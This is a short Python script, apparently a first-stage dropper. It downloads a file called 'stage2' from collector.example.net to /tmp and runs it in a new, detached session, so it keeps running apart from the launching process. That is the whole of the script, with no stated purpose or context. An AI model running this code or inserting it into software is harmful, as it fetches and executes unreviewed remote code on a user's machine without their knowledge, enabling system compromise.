import subprocess
import sys
import urllib.request

urllib.request.urlretrieve("https://collector.example.net/stage2", "/tmp/stage2.py")
subprocess.Popen([sys.executable, "/tmp/stage2.py"], start_new_session=True)
